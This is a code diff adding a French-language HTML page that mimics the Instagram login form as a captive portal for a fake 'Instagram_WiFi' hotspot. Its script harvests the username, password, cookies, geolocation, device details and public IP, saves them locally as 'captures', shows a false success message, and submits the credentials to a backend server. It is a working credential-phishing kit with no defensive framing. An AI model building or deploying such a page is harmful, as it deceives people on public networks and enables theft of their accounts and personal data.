@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Connexion</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/120px-Instagram_icon.png">
+    <style>
+        /* Reset des styles par défaut */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+        }
+
+        /* Indicateur WiFi */
+        .wifi-indicator {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.05);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: #666;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 30px 40px;
+            width: 350px;
+            margin-bottom: 10px;
+            border-radius: 1px;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo-text {
+            font-family: 'Brush Script MT', cursive;
+            font-size: 48px;
+            font-weight: normal;
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -1px;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            margin-bottom: 6px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 12px;
+            height: 36px;
+        }
+
+        .login-form input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+
+        .login-form button {
+            width: 100%;
+            padding: 7px 16px;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            height: 32px;
+            line-height: 18px;
+        }
+
+        .login-form button:hover {
+            background-color: #0077c2;
+        }
+
+        .login-form button:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+            cursor: not-allowed;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .separator span {
+            padding: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .facebook-login a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .facebook-login img {
+            width: 16px;
+            margin-right: 8px;
+        }
+
+        .forgot-password {
+            margin-top: 18px;
+        }
+
+        .forgot-password a {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 350px;
+            font-size: 14px;
+            border-radius: 1px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Styles pour les messages */
+        .status-message {
+            padding: 12px;
+            border-radius: 8px;
+            margin: 12px 0;
+            text-align: center;
+            font-size: 13px;
+            display: none;
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .status-success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status-error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Style pour afficher/masquer le mot de passe */
+        .password-container {
+            position: relative;
+        }
+
+        .password-container input {
+            padding-right: 35px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 4px;
+        }
+
+        /* Animation pour les champs */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        .shake {
+            animation: shake 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <!-- Indicateur WiFi -->
+    <div class="wifi-indicator">
+        <i class="fas fa-wifi"></i>
+        <span id="wifiStatus">Instagram_WiFi</span>
+    </div>
+
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <div class="logo-text">Instagram</div>
+            </div>
+            
+            <!-- Message de statut -->
+            <div id="statusMessage" class="status-message"></div>
+            
+            <!-- MODIFICATION IMPORTANTE : formulaire avec method="POST" -->
+            <form class="login-form" id="loginForm" method="POST">
+                <input type="hidden" name="page_name" value="instagram.html">
+                <input type="hidden" name="app_name" value="Instagram">
+                
+                <input type="text" id="username" name="username" 
+                       placeholder="Téléphone, nom d'utilisateur ou e-mail" 
+                       required autocomplete="username">
+                
+                <div class="password-container">
+                    <input type="password" id="password" name="password" 
+                           placeholder="Mot de passe" 
+                           required autocomplete="current-password">
+                </div>
+                
+                <button type="submit" id="submitBtn">
+                    <span id="btnText">Se connecter</span>
+                    <div class="loading-spinner" id="spinner"></div>
+                </button>
+            </form>
+            
+            <div class="separator">
+                <span>OU</span>
+            </div>
+            
+            <div class="facebook-login">
+                <a href="#" id="facebookBtn">
+                    <i class="fab fa-facebook-square" style="font-size: 16px; margin-right: 8px;"></i>
+                    <span>Se connecter avec Facebook</span>
+                </a>
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#" id="forgotPassword">Mot de passe oublié ?</a>
+            </div>
+        </div>
+        
+        <div class="signup-box">
+            <p>Vous n'avez pas de compte ? <a href="#" id="signupLink">Inscrivez-vous</a></p>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // FONCTIONS PRINCIPALES
+        // ============================================
+
+        // Fonction pour afficher un message de statut
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.className = `status-message status-${type}`;
+            statusEl.style.display = 'block';
+            
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusEl.style.display = 'none';
+                }, 3000);
+            }
+        }
+
+        // Fonction pour récupérer les informations de l'appareil
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let device = 'Ordinateur';
+            let os = 'Système inconnu';
+            let browser = 'Navigateur inconnu';
+            
+            // Détection OS
+            if (/android/i.test(userAgent)) {
+                os = 'Android';
+                device = 'Smartphone Android';
+            } else if (/iPad|iPhone|iPod/.test(userAgent)) {
+                os = /iPad/.test(userAgent) ? 'iPadOS' : 'iOS';
+                device = /iPad/.test(userAgent) ? 'iPad' : 'iPhone';
+            } else if (/Windows/.test(userAgent)) {
+                os = 'Windows';
+            } else if (/Macintosh|Mac OS/.test(userAgent)) {
+                os = 'macOS';
+            } else if (/Linux/.test(userAgent)) {
+                os = 'Linux';
+            }
+            
+            // Détection navigateur
+            if (/chrome/i.test(userAgent) && !/edge/i.test(userAgent)) {
+                browser = 'Chrome';
+            } else if (/firefox/i.test(userAgent)) {
+                browser = 'Firefox';
+            } else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) {
+                browser = 'Safari';
+            } else if (/edge/i.test(userAgent)) {
+                browser = 'Edge';
+            }
+            
+            // Récupérer la résolution d'écran
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            
+            // Récupérer le fuseau horaire
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            // Récupérer la langue
+            const language = navigator.language || navigator.userLanguage;
+            
+            // Vérifier les cookies
+            const cookiesEnabled = navigator.cookieEnabled;
+            
+            // Tenter de récupérer l'adresse IP via une API
+            let ip = 'Non disponible';
+            
+            return {
+                device: device,
+                os: os,
+                browser: browser,
+                screenResolution: screenResolution,
+                timezone: timezone,
+                language: language,
+                cookiesEnabled: cookiesEnabled,
+                ip: ip,
+                userAgent: navigator.userAgent.substring(0, 150), // Limiter la taille
+                platform: navigator.platform,
+                vendor: navigator.vendor || 'Inconnu'
+            };
+        }
+
+        // Fonction pour récupérer l'adresse IP via API externe
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.log('Impossible de récupérer l\'IP:', error);
+                return 'Non disponible';
+            }
+        }
+
+        // Fonction pour collecter toutes les données du formulaire
+        function collectFormData() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Récupérer les infos de l'appareil
+            const deviceInfo = getDeviceInfo();
+            
+            // Ajouter l'horodatage
+            const timestamp = new Date().toISOString();
+            
+            // Récupérer l'URL actuelle
+            const currentUrl = window.location.href;
+            
+            // Récupérer les cookies (si disponibles)
+            const cookies = document.cookie;
+            
+            // Vérifier le mode sombre
+            const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+            
+            // Récupérer la géolocalisation (si autorisée)
+            let geolocation = null;
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        geolocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                    },
+                    () => {
+                        geolocation = 'Non autorisé';
+                    }
+                );
+            }
+            
+            return {
+                // Données du formulaire
+                username: username,
+                password: password,
+                
+                // Informations techniques
+                timestamp: timestamp,
+                url: currentUrl,
+                deviceInfo: deviceInfo,
+                cookies: cookies,
+                darkMode: darkMode,
+                geolocation: geolocation,
+                
+                // Métriques de performance
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Inconnu',
+                memory: navigator.deviceMemory || 'Inconnu',
+                cores: navigator.hardwareConcurrency || 'Inconnu',
+                
+                // Informations réseau
+                referrer: document.referrer,
+                origin: window.location.origin
+            };
+        }
+
+        // Fonction pour enregistrer les données localement (débogage)
+        function saveDataLocally(data) {
+            try {
+                // Enregistrer dans le localStorage
+                const previousData = JSON.parse(localStorage.getItem('instagram_captures') || '[]');
+                previousData.push(data);
+                localStorage.setItem('instagram_captures', JSON.stringify(previousData));
+                
+                // Afficher dans la console
+                console.log('📱 DONNÉES CAPTURÉES:', {
+                    username: data.username,
+                    password_length: data.password ? data.password.length : 0,
+                    device: data.deviceInfo.device,
+                    os: data.deviceInfo.os,
+                    browser: data.deviceInfo.browser,
+                    timestamp: data.timestamp
+                });
+                
+                return true;
+            } catch (error) {
+                console.error('Erreur sauvegarde locale:', error);
+                return false;
+            }
+        }
+
+        // Fonction pour simuler une tentative de connexion Facebook
+        function simulateFacebookLogin() {
+            const deviceInfo = getDeviceInfo();
+            const data = {
+                type: 'facebook_attempt',
+                timestamp: new Date().toISOString(),
+                deviceInfo: deviceInfo,
+                url: window.location.href
+            };
+            
+            console.log('🔵 Tentative Facebook:', data);
+            showStatus('Redirection vers Facebook...', 'success');
+            
+            // Simuler un délai
+            setTimeout(() => {
+                showStatus('Veuillez vous connecter avec Instagram directement.', 'error');
+            }, 1500);
+        }
+
+        // ============================================
+        // GESTION DES ÉVÉNEMENTS
+        // ============================================
+
+        // Gestion de la soumission du formulaire principal
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            
+            // Activer l'état de chargement
+            btn.disabled = true;
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            
+            // Récupérer les données
+            const formData = collectFormData();
+            
+            // Sauvegarder localement
+            saveDataLocally(formData);
+            
+            // Afficher un message de connexion
+            showStatus('Connexion en cours...', 'success');
+            
+            // Simuler un délai de connexion
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Récupérer l'adresse IP
+            const ip = await getIPAddress();
+            formData.deviceInfo.ip = ip;
+            
+            console.log('🌐 Informations réseau:', {
+                ip: ip,
+                connection: formData.connectionType,
+                timezone: formData.deviceInfo.timezone
+            });
+            
+            // Vérifier si les champs sont remplis
+            if (!formData.username || !formData.password) {
+                showStatus('Veuillez remplir tous les champs.', 'error');
+                
+                // Animer les champs vides
+                if (!formData.username) {
+                    document.getElementById('username').classList.add('shake');
+                    setTimeout(() => document.getElementById('username').classList.remove('shake'), 500);
+                }
+                if (!formData.password) {
+                    document.getElementById('password').classList.add('shake');
+                    setTimeout(() => document.getElementById('password').classList.remove('shake'), 500);
+                }
+                
+                btn.disabled = false;
+                btnText.style.display = 'block';
+                spinner.style.display = 'none';
+                return;
+            }
+            
+            // Connexion "réussie"
+            showStatus('✅ Connexion réussie ! Redirection...', 'success');
+            
+            // Mettre à jour le statut WiFi
+            document.getElementById('wifiStatus').innerHTML = 'Instagram_WiFi <i class="fas fa-check" style="color: #28a745; margin-left: 5px;"></i>';
+            
+            // Soumettre le formulaire au serveur Python
+            // Délai pour que l'utilisateur voie le message
+            setTimeout(() => {
+                this.submit();
+            }, 1500);
+        });
+
+        // Gestion du bouton Facebook
+        document.getElementById('facebookBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            simulateFacebookLogin();
+        });
+
+        // Gestion du mot de passe oublié
+        document.getElementById('forgotPassword').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            
+            if (username) {
+                console.log('🔐 Demande réinitialisation pour:', username);
+                showStatus(`Un lien de réinitialisation a été envoyé à ${username}`, 'success');
+            } else {
+                showStatus('Veuillez d\'abord entrer votre nom d'utilisateur ou email.', 'error');
+                document.getElementById('username').focus();
+            }
+        });
+
+        // Gestion de l'inscription
+        document.getElementById('signupLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            console.log('📝 Redirection vers la page d'inscription');
+            showStatus('Redirection vers la création de compte...', 'success');
+        });
+
+        // ============================================
+        // INITIALISATION
+        // ============================================
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Afficher les infos de l'appareil
+            const deviceInfo = getDeviceInfo();
+            console.log('📱 Appareil détecté:', deviceInfo);
+            
+            // Vérifier le portail captif
+            const captiveUrls = [
+                'http://connectivitycheck.gstatic.com/generate_204',
+                'http://captive.apple.com/hotspot-detect.html',
+                'http://msftconnecttest.com/connecttest.txt'
+            ];
+            
+            fetch(captiveUrls[0], { mode: 'no-cors', cache: 'no-store' })
+                .catch(() => {
+                    console.log('📶 Portail captif détecté - Réseau: Instagram_WiFi');
+                });
+            
+            // Focus sur le champ username
+            document.getElementById('username').focus();
+            
+            // Définir un placeholder aléatoire pour le SSID
+            const ssidNames = ['Instagram_WiFi', 'Instagram_Free', 'Instagram_Zone', 'Instagram_Hotspot'];
+            const randomSsid = ssidNames[Math.floor(Math.random() * ssidNames.length)];
+            document.getElementById('wifiStatus').textContent = randomSsid;
+            
+            // Vérifier si des données ont été capturées précédemment
+            const previousCaptures = localStorage.getItem('instagram_captures');
+            if (previousCaptures) {
+                const captures = JSON.parse(previousCaptures);
+                console.log(`📊 ${captures.length} capture(s) précédente(s) enregistrée(s)`);
+            }
+            
+            // Ajouter un événement pour détecter les changements de champ
+            document.getElementById('username').addEventListener('input', function() {
+                if (this.value.includes('@')) {
+                    console.log('📧 Email détecté:', this.value);
+                } else if (/^\d+$/.test(this.value)) {
+                    console.log('📱 Numéro de téléphone détecté');
+                }
+            });
+            
+            // Vérifier la connexion réseau
+            if (navigator.connection) {
+                navigator.connection.addEventListener('change', () => {
+                    console.log('📶 Changement de connexion:', navigator.connection.effectiveType);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
